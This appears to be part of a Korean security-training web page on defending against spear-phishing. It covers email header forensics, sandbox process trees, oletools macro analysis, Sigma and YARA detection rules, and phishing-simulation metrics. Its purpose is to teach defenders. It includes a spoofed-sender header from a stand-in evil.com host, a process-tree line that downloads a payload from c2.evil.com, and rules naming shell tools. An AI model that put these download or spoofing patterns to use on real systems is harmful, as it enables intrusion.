-            <section id="ch2" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#2.</span> 이메일 헤더 포렌식</h2>
-                <div class="space-y-6">
-                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
-                        <div class="text-2xl mb-2">🔍</div>
-                        <h3 class="font-bold text-lg mb-2 hl-blue">SPF, DKIM, DMARC 분석</h3>
-                        <p class="text-cgray dark:text-slate-300 leading-relaxed">이메일 헤더에는 발신자 검증 정보가 포함됩니다. SPF(발신 IP 검증), DKIM(디지털 서명), DMARC(정책 적용)를 분석하면 위조된 발신자를 식별할 수 있습니다. Return-Path와 From 헤더가 불일치하면 스푸핑 가능성이 높습니다.</p>
-                    </div>
-                    <div class="glass-panel rounded-xl overflow-hidden">
-                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
-                            <div class="flex items-center gap-2">
-                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
-                                <span class="text-xs text-slate-400 ml-2 font-mono">suspicious_header.txt</span>
-                            </div>
-                            <span class="text-[10px] text-slate-500 font-mono">email header</span>
-                        </div>
-                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 — 실제 이메일 헤더 분석 예시</div>
-                        <div class="terminal-bg p-4 overflow-x-auto">
-                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">Received: from mail-attacker.evil.com (192.168.1.100)</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">  by mx.company.com with SMTP; Mon, 03 Mar 2026</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">From: ceo@trusted-company.com   &lt;-- 위조된 발신자</div>
-                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">Return-Path: &lt;attacker@evil.com&gt;  &lt;-- 실제 발신자</div>
-                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
-                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">Authentication-Results: mx.company.com;</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">  spf=fail (sender IP not authorized)</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">  dkim=fail (signature verification failed)</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">  dmarc=fail (p=reject)</div>
-                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">X-Originating-IP: 192.168.1.100</div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <section id="ch3" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#3.</span> 첨부파일 동적 분석</h2>
-                <div class="space-y-6">
-                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
-                        <div class="text-2xl mb-2">🧪</div>
-                        <h3 class="font-bold text-lg mb-2 hl-blue">샌드박스 실행과 프로세스 트리</h3>
-                        <p class="text-cgray dark:text-slate-300 leading-relaxed">악성 첨부파일을 격리된 샌드박스(Any.Run, Joe Sandbox 등)에서 실행하면 실제 행위를 관찰할 수 있습니다. 프로세스 트리에서 svchost.exe → WINWORD.EXE → cmd.exe → powershell.exe 체인은 매크로 기반 공격의 전형적 패턴입니다.</p>
-                    </div>
-                    <div class="glass-panel rounded-xl overflow-hidden">
-                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
-                            <div class="flex items-center gap-2">
-                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
-                                <span class="text-xs text-slate-400 ml-2 font-mono">process_tree.txt</span>
-                            </div>
-                            <span class="text-[10px] text-slate-500 font-mono">process tree</span>
-                        </div>
-                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 — 샌드박스 프로세스 트리 예시</div>
-                        <div class="terminal-bg p-4 overflow-x-auto">
-                            <pre class="text-xs leading-relaxed">  svchost.exe (PID: 684)
-  └── WINWORD.EXE (PID: 3412)  ← 문서 열림
-      └── cmd.exe (PID: 5028)   ← 매크로가 cmd 실행
-          └── powershell.exe (PID: 6104)  ← 페이로드 다운로드
-              ├── Invoke-WebRequest http://c2.evil.com/payload
-              └── rundll32.exe (PID: 7210)  ← DLL 실행</pre>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <section id="ch4" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#4.</span> OLE 구조와 oletools</h2>
-                <div class="space-y-6">
-                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
-                        <div class="text-2xl mb-2">🔧</div>
-                        <h3 class="font-bold text-lg mb-2 hl-blue">olevba와 oleid로 매크로 추출</h3>
-                        <p class="text-cgray dark:text-slate-300 leading-relaxed">oletools는 OLE2 파일(Office 문서)을 분석하는 Python 도구 모음입니다. olevba는 VBA 매크로를 추출하고 위험도를 평가합니다. oleid는 파일의 OLE 속성과 잠재적 위험 지표를 식별합니다. 매크로 없이 실행할 수 있어 안전한 정적 분석이 가능합니다.</p>
-                    </div>
-                    <div class="glass-panel rounded-xl overflow-hidden">
-                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
-                            <div class="flex items-center gap-2">
-                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
-                                <span class="text-xs text-slate-400 ml-2 font-mono">oletools_analysis.sh</span>
-                            </div>
-                            <span class="text-[10px] text-slate-500 font-mono">bash</span>
-                        </div>
-                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 — 격리된 분석 환경에서만 실행</div>
-                        <div class="terminal-bg p-4 overflow-x-auto">
-                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre"># olevba: VBA 매크로 추출 및 분석</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">olevba suspicious_invoice.docm</div>
-                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
-                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre"># 출력 예시:</div>
-                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">+----------+--------------------+---------------------------------------------+</div>
-                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">| Type     | Keyword            | Description                                 |</div>
-                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">+----------+--------------------+---------------------------------------------+</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">| AutoExec | AutoOpen           | Runs when document is opened                |</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">| Suspicious| Shell             | May run an executable                       |</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">| Suspicious| powershell        | May run PowerShell commands                 |</div>
-                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">| IOC      | http://c2.evil.com | URL (potential C2 server)                   |</div>
-                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
-                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre"># oleid: OLE 파일 속성 확인</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">oleid suspicious_invoice.docm</div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <section id="ch5" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#5.</span> Sigma 탐지 규칙</h2>
-                <div class="space-y-6">
-                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
-                        <div class="text-2xl mb-2">📋</div>
-                        <h3 class="font-bold text-lg mb-2 hl-blue">Office에서 의심스러운 자식 프로세스 탐지</h3>
-                        <p class="text-cgray dark:text-slate-300 leading-relaxed">정상적인 Office 프로세스는 cmd.exe, powershell.exe, wscript.exe 등을 자식 프로세스로 생성하지 않습니다. Sigma 규칙으로 WINWORD.EXE, EXCEL.EXE 등이 의심스러운 자식 프로세스를 생성하는 것을 탐지할 수 있습니다.</p>
-                    </div>
-                    <div class="glass-panel rounded-xl overflow-hidden">
-                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
-                            <div class="flex items-center gap-2">
-                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
-                                <span class="text-xs text-slate-400 ml-2 font-mono">office_child_process.yml</span>
-                            </div>
-                            <span class="text-[10px] text-slate-500 font-mono">yaml</span>
-                        </div>
-                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 — Sigma 탐지 규칙 예시</div>
-                        <div class="terminal-bg p-4 overflow-x-auto">
-                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">title: Office Application Spawning Suspicious Process</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">status: production</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">level: high</div>
-                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">description: Detects Office spawning cmd, powershell, wscript</div>
-                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
-                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">logsource:</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">  category: process_creation</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">  product: windows</div>
-                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
-                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">detection:</div>
-                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">  selection_parent:</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">    ParentImage|endswith:</div>
-                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">      - &#39;\WINWORD.EXE&#39;</div>
-                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">      - &#39;\EXCEL.EXE&#39;</div>
-                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">      - &#39;\POWERPNT.EXE&#39;</div>
-                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">  selection_child:</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">    Image|endswith:</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">      - &#39;\cmd.exe&#39;</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">      - &#39;\powershell.exe&#39;</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">      - &#39;\wscript.exe&#39;</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">      - &#39;\mshta.exe&#39;</div>
-                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">  condition: selection_parent and selection_child</div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <section id="ch6" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#6.</span> YARA 규칙 기초</h2>
-                <div class="space-y-6">
-                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
-                        <div class="text-2xl mb-2">🎯</div>
-                        <h3 class="font-bold text-lg mb-2 hl-blue">악성 Office 문서 탐지</h3>
-                        <p class="text-cgray dark:text-slate-300 leading-relaxed">YARA 규칙으로 악성 Office 문서를 탐지할 수 있습니다. OLE2 파일의 매직 바이트(D0 CF 11 E0), 의심스러운 VBA 문자열(Shell, PowerShell, WScript.Shell), 난독화 패턴(Chr(), ChrW())을 조합하여 정밀한 탐지가 가능합니다.</p>
-                    </div>
-                    <div class="glass-panel rounded-xl overflow-hidden">
-                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
-                            <div class="flex items-center gap-2">
-                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
-                                <span class="text-xs text-slate-400 ml-2 font-mono">detect_malicious_doc.yar</span>
-                            </div>
-                            <span class="text-[10px] text-slate-500 font-mono">yara</span>
-                        </div>
-                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 — YARA 탐지 규칙 예시</div>
-                        <div class="terminal-bg p-4 overflow-x-auto">
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">rule Malicious_Office_Macro {</div>
-                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">    meta:</div>
-                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">        author = &#34;GOTROOT EDU&#34;</div>
-                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">        description = &#34;Detects Office docs with suspicious macros&#34;</div>
-                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
-                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">    strings:</div>
-                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">        $ole_magic = { D0 CF 11 E0 A1 B1 1A E1 }</div>
-                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">        $s1 = &#34;AutoOpen&#34; ascii wide</div>
-                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">        $s2 = &#34;Document_Open&#34; ascii wide</div>
-                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">        $s3 = &#34;Shell&#34; ascii wide</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">        $s4 = &#34;powershell&#34; ascii wide nocase</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">        $s5 = &#34;WScript.Shell&#34; ascii wide</div>
-                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
-                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">    condition:</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">        $ole_magic at 0 and (1 of ($s1,$s2)) and (1 of ($s3,$s4,$s5))</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">}</div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <section id="ch7" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#7.</span> 이메일 보안 게이트웨이</h2>
-                <div class="space-y-6">
-                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
-                        <div class="text-2xl mb-2">🛡️</div>
-                        <h3 class="font-bold text-lg mb-2 hl-blue">SPF/DKIM/DMARC 구현 아키텍처</h3>
-                        <p class="text-cgray dark:text-slate-300 leading-relaxed">이메일 보안 게이트웨이는 수신 이메일의 SPF, DKIM, DMARC 검증을 수행합니다. SPF는 DNS TXT 레코드로 허가된 발신 IP를 정의하고, DKIM은 이메일에 디지털 서명을 추가하며, DMARC는 SPF/DKIM 실패 시 적용할 정책(none/quarantine/reject)을 지정합니다.</p>
-                    </div>
-                    <div class="glass-panel p-6 rounded-xl">
-                        <h3 class="font-bold text-lg mb-4 hl-blue">이메일 인증 플로우</h3>
-                        <div class="terminal-bg rounded-lg p-4 overflow-x-auto">
-                            <pre class="text-xs leading-relaxed">  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
-  │  발신 서버    │───→│  수신 MTA     │───→│  사용자 받은편지함│
-  │ mail.evil.com│    │ mx.company.com│    │              │
-  └──────────────┘    └──────┬───────┘    └──────────────┘
-                             │
-                    ┌────────┴────────┐
-                    │  인증 검증 단계   │
-                    ├─────────────────┤
-                    │ 1. SPF 검증      │  DNS TXT → IP 허가 확인
-                    │ 2. DKIM 검증     │  공개키로 서명 검증
-                    │ 3. DMARC 정책    │  실패 시 reject/quarantine
-                    └─────────────────┘</pre>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <section id="ch8" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#8.</span> 사용자 보안 인식 교육</h2>
-                <div class="space-y-6">
-                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
-                        <div class="text-2xl mb-2">👥</div>
-                        <h3 class="font-bold text-lg mb-2 hl-blue">피싱 시뮬레이션 프로그램</h3>
-                        <p class="text-cgray dark:text-slate-300 leading-relaxed">기술적 방어만으로는 스피어피싱을 완전히 차단할 수 없습니다. 사용자 보안 인식 교육과 피싱 시뮬레이션을 통해 인적 방어력을 높여야 합니다. 정기적인 시뮬레이션으로 클릭률(Click Rate)을 측정하고, 반복 교육으로 개선합니다.</p>
-                    </div>
-                    <div class="glass-panel p-6 rounded-xl">
-                        <h3 class="font-bold text-lg mb-4 hl-blue">피싱 시뮬레이션 핵심 지표</h3>
-                        <div class="overflow-x-auto">
-                            <table class="w-full text-sm border-collapse">
-                                <thead>
-                                    <tr class="bg-blue-500/10 dark:bg-blue-500/5">
-                                        <th class="text-left p-3 font-bold border-b border-blue-400/30">지표</th>
-                                        <th class="text-left p-3 font-bold border-b border-blue-400/30">설명</th>
-                                        <th class="text-left p-3 font-bold border-b border-blue-400/30">목표</th>
-                                    </tr>
-                                </thead>
-                                <tbody class="text-cgray dark:text-slate-300">
-                                    <tr class="border-b border-slate-200 dark:border-slate-700">
-                                        <td class="p-3 font-bold">클릭률 (Click Rate)</td>
-                                        <td class="p-3 text-center">피싱 링크/첨부파일 클릭 비율</td>
-                                        <td class="p-3 text-center">&lt; 5%</td>
-                                    </tr>
-                                    <tr class="border-b border-slate-200 dark:border-slate-700">
-                                        <td class="p-3 font-bold">신고율 (Report Rate)</td>
-                                        <td class="p-3 text-center">의심 이메일 보안팀 신고 비율</td>
-                                        <td class="p-3 text-center">&gt; 70%</td>
-                                    </tr>
-                                    <tr class="border-b border-slate-200 dark:border-slate-700">
-                                        <td class="p-3 font-bold">반복 실패율</td>
-                                        <td class="p-3 text-center">2회 이상 피싱에 걸린 사용자 비율</td>
-                                        <td class="p-3 text-center">&lt; 2%</td>
-                                    </tr>
-                                    <tr>
-                                        <td class="p-3 font-bold">평균 신고 시간</td>
-                                        <td class="p-3 text-center">피싱 수신 후 신고까지 걸린 시간</td>
-                                        <td class="p-3 text-center">&lt; 10분</td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- ═══════════════════════════════════════════════ -->
-            <!-- Mini Labs -->
-            <!-- ═══════════════════════════════════════════════ -->
-            <section id="minilab-0" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-emerald-400 pb-2 text-[#1e293b] dark:text-white"><span class="text-emerald-500">#9.</span> Mini Lab — 이메일 헤더 필드와 보안 기능 매칭</h2>
-                <div class="glass-panel rounded-xl overflow-hidden">
-                    <div class="terminal-bg px-4 py-2 flex items-center gap-2 border-b border-slate-600">
-                        <span class="w-3 h-3 rounded-full bg-red-500"></span>
-                        <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
-                        <span class="w-3 h-3 rounded-full bg-green-500"></span>
-                        <span class="text-xs text-slate-400 ml-2 font-mono">mini-lab-1.sh</span>
-                    </div>
-                    <div class="p-6 space-y-4">
-                        <p class="text-sm text-cgray dark:text-slate-300 mb-4">각 이메일 보안 프로토콜/헤더 필드가 어떤 역할을 하는지 매칭하세요.</p>
-                        <div id="match-game-0" class="space-y-4"></div>
-                        <div class="flex items-center justify-between mt-6 pt-4 border-t border-slate-200 dark:border-slate-700">
-                            <div class="font-mono text-sm">점수: <span id="match-score-0" class="hl-blue text-lg">0</span> / <span>5</span></div>
-                            <button onclick="initMatchGame_0()" class="bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 text-slate-700 dark:text-slate-300 font-bold py-2 px-4 rounded font-mono text-sm transition cursor-pointer">↻ 다시 시작</button>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <section id="minilab-1" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-emerald-400 pb-2 text-[#1e293b] dark:text-white"><span class="text-emerald-500">#10.</span> Mini Lab — 악성 첨부파일 분석 절차</h2>
-                <div class="glass-panel rounded-xl overflow-hidden">
-                    <div class="terminal-bg px-4 py-2 flex items-center gap-2 border-b border-slate-600">
-                        <span class="w-3 h-3 rounded-full bg-red-500"></span>
-                        <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
-                        <span class="w-3 h-3 rounded-full bg-green-500"></span>
-                        <span class="text-xs text-slate-400 ml-2 font-mono">mini-lab-2.sh</span>
-                    </div>
-                    <div class="p-6 space-y-4">
-                        <p class="text-sm text-cgray dark:text-slate-300 mb-4">악성 첨부파일을 분석하는 올바른 절차를 순서대로 따라가 보세요.</p>
-                        <div id="step-click-1" class="space-y-3">
-                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="0" onclick="handleStepClick_1(0)">
-                                <div class="flex items-center gap-3">
-                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">1️⃣</div>
-                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">이메일 헤더 확인</div>
-                                </div>
-                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">먼저 이메일 헤더에서 SPF, DKIM, DMARC 검증 결과를 확인합니다. Return-Path와 From 헤더의 일치 여부, X-Originating-IP 등을 검토합니다.</div>
-                            </div>
-                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="1" onclick="handleStepClick_1(1)">
-                                <div class="flex items-center gap-3">
-                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">2️⃣</div>
-                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">첨부파일 해시 추출</div>
-                                </div>
-                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">첨부파일을 열지 않고 SHA-256 해시를 추출합니다. certutil -hashfile 또는 sha256sum 명령을 사용합니다.</div>
-                            </div>
-                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="2" onclick="handleStepClick_1(2)">
-                                <div class="flex items-center gap-3">
-                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">3️⃣</div>
-                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">VirusTotal 조회</div>
-                                </div>
-                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">추출한 해시를 VirusTotal에서 조회하여 기존 악성코드 탐지 여부를 확인합니다. 70개 이상의 AV 엔진 결과를 확인할 수 있습니다.</div>
-                            </div>
-                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="3" onclick="handleStepClick_1(3)">
-                                <div class="flex items-center gap-3">
-                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">4️⃣</div>
-                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">샌드박스 실행</div>
-                                </div>
-                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">격리된 샌드박스(Any.Run, Joe Sandbox)에서 첨부파일을 실행하여 동적 행위(프로세스 생성, 네트워크 연결, 파일 변경)를 관찰합니다.</div>
-                            </div>
-                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="4" onclick="handleStepClick_1(4)">
-                                <div class="flex items-center gap-3">
-                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">5️⃣</div>
-                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">매크로 추출 (olevba)</div>
-                                </div>
-                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">olevba 도구로 VBA 매크로를 추출하고 분석합니다. AutoOpen, Shell, PowerShell 등 의심스러운 키워드와 C2 URL을 식별합니다.</div>
-                            </div>
-                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="5" onclick="handleStepClick_1(5)">
-                                <div class="flex items-center gap-3">
-                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">6️⃣</div>
-                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">IOC 등록</div>
-                                </div>
-                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">분석에서 발견된 IOC(파일 해시, C2 도메인/IP, YARA 시그니처)를 위협 인텔리전스 플랫폼(MISP, OpenCTI)에 등록하고 조직 내 공유합니다.</div>
-                            </div>
-                        </div>
-                        <div id="step-result-1" class="hidden mt-4 p-4 rounded-lg bg-blue-50 dark:bg-blue-900/20 border border-blue-300 dark:border-blue-700 text-center">
-                            <p class="text-sm font-bold text-blue-700 dark:text-blue-400">🎉 모든 단계를 완료했습니다!</p>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <section id="minilab-2" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-emerald-400 pb-2 text-[#1e293b] dark:text-white"><span class="text-emerald-500">#11.</span> Mini Lab — SPF 레코드 빈칸 채우기</h2>
-                <div class="glass-panel rounded-xl overflow-hidden">
-                    <div class="terminal-bg px-4 py-2 flex items-center gap-2 border-b border-slate-600">
-                        <span class="w-3 h-3 rounded-full bg-red-500"></span>
-                        <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
-                        <span class="w-3 h-3 rounded-full bg-green-500"></span>
-                        <span class="text-xs text-slate-400 ml-2 font-mono">mini-lab-3.sh</span>
-                    </div>
-                    <div class="p-6 space-y-4">
-                        <p class="text-sm text-cgray dark:text-slate-300 mb-4">SPF DNS 레코드의 빈칸을 올바른 값으로 채우세요.</p>
-                        <div class="terminal-bg rounded-lg overflow-hidden">
-                            <div class="px-4 py-2 flex items-center gap-2 border-b border-slate-600">
-                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
-                                <span class="text-xs text-slate-400 ml-2 font-mono">spf_record.txt</span>
-                            </div>
-                            <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 — SPF 레코드 구성 학습</div>
-                            <div class="p-4 space-y-1" id="code-fill-2">
-                                <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre"># DNS TXT 레코드 (SPF)</div>
-                                <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">company.com. IN TXT</div>
-                                <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
-                                <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">&#34;<input type="text" class="code-blank bg-transparent border-0 border-b-2 border-dashed border-blue-400 text-blue-300 font-mono text-xs w-24 text-center focus:outline-none focus:border-blue-300" data-blank-id="blank1" data-answer="v=spf1" placeholder="버전?"> <input type="text" class="code-blank bg-transparent border-0 border-b-2 border-dashed border-blue-400 text-blue-300 font-mono text-xs w-40 text-center focus:outline-none focus:border-blue-300" data-blank-id="blank2" data-answer="include:_spf.google.com" placeholder="허가 도메인?"> <input type="text" class="code-blank bg-transparent border-0 border-b-2 border-dashed border-blue-400 text-blue-300 font-mono text-xs w-20 text-center focus:outline-none focus:border-blue-300" data-blank-id="blank3" data-answer="~all" placeholder="정책?">&#34;</div>
-                                <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
